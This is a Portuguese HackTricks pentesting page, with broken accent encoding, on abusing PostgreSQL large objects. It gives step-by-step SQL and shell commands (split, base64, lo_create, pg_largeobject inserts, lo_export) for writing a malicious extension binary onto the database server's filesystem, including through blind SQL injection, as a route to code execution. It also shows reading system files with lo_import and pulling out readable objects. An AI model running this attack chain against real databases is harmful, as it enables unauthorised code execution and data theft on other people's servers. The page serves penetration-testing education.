<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Objetos Grandes no PostgreSQL

O PostgreSQL exp√µe uma estrutura chamada **objeto grande** (tabela `pg_largeobject`), que √© utilizada para armazenar dados que seriam dif√≠ceis de manipular por inteiro (como uma imagem ou um documento PDF). Ao contr√°rio da fun√ß√£o `COPY TO`, a vantagem dos **objetos grandes** est√° no fato de que os **dados** que eles **cont√™m** podem ser **exportados de volta** para o **sistema de arquivos** como uma **c√≥pia id√™ntica do arquivo original importado**.

Para **salvar um arquivo completo dentro desta tabela**, voc√™ primeiro precisa **criar um objeto** dentro da tabela mencionada (identificado por um **LOID**) e depois **inserir peda√ßos de 2KB** dentro deste objeto. √â muito importante que todos os **peda√ßos tenham 2KB** (exceto possivelmente o √∫ltimo) **ou** a fun√ß√£o de **exporta√ß√£o** para o sistema de arquivos **n√£o funcionar√°**.

Para **dividir** seu **bin√°rio** em **peda√ßos** de tamanho **2KB**, voc√™ pode fazer:
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
Para codificar cada um dos arquivos criados em Base64 ou Hex, voc√™ pode usar:
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
Ao explorar isso, lembre-se de que voc√™ deve enviar **peda√ßos de 2KB de bytes em texto claro** (n√£o 2KB de bytes codificados em base64 ou hex). Se tentar automatizar isso, o tamanho de um arquivo **codificado em hex** √© o **dobro** (ent√£o voc√™ precisa enviar 4KB de dados codificados para cada peda√ßo) e o tamanho de um arquivo codificado em **base64** √© `ceil(n / 3) * 4`
{% endhint %}

Tamb√©m, ao depurar o processo, voc√™ pode ver o conte√∫do dos grandes objetos criados com:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# Usando lo\_creat & Base64

Primeiro, precisamos criar um LOID onde os dados bin√°rios ser√£o salvos:
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
Se voc√™ estiver explorando uma **Blind SQLinjection**, ter√° mais interesse em usar `lo_create` com um **LOID fixo** para **saber onde** deve **fazer upload** do **conte√∫do**.\
Observe tamb√©m que n√£o h√° erro de sintaxe, as fun√ß√µes s√£o `lo_creat` e `lo_create`.

LOID √© usado para identificar o objeto na tabela `pg_largeobject`. A inser√ß√£o de peda√ßos de tamanho 2KB na tabela `pg_largeobject` pode ser realizada usando:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
Finalmente, voc√™ pode exportar o arquivo para o sistema de arquivos executando (durante este exemplo, o LOID usado foi `173454`):
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
Observe que nas vers√µes mais recentes do postgres voc√™ pode precisar **carregar as extens√µes sem indicar nenhum caminho**. [**Leia isto para mais informa√ß√µes**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

Voc√™ possivelmente estar√° interessado em deletar o objeto grande criado ap√≥s export√°-lo:
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# Usando lo\_import & Hex

Neste cen√°rio, lo\_import ser√° usado para criar um objeto de grande porte. Felizmente, neste caso, voc√™ pode (e n√£o pode) especificar o LOID que gostaria de usar:
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
Ap√≥s criar o objeto, voc√™ pode come√ßar a inserir os dados em cada p√°gina (lembre-se, voc√™ deve inserir peda√ßos de 2KB):
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
O HEX deve ser apenas o hex (sem `0x` ou `\x`), exemplo:
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
Finalmente, exporte os dados para um arquivo e delete o large object:
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
Observe que nas vers√µes mais recentes do postgres voc√™ pode precisar **fazer o upload das extens√µes sem indicar nenhum caminho**. [**Leia isto para mais informa√ß√µes**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# Limita√ß√µes

Ap√≥s ler a documenta√ß√£o sobre objetos grandes no PostgreSQL, podemos descobrir que **objetos grandes podem ter ACL** (Lista de Controle de Acesso). √â poss√≠vel configurar **novos objetos grandes** de modo que seu usu√°rio **n√£o tenha privil√©gios suficientes** para l√™-los, mesmo que tenham sido criados pelo seu usu√°rio.

No entanto, pode haver **objetos antigos com uma ACL que permite ao usu√°rio atual l√™-los**, ent√£o podemos exfiltrar o conte√∫do desse objeto.


<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
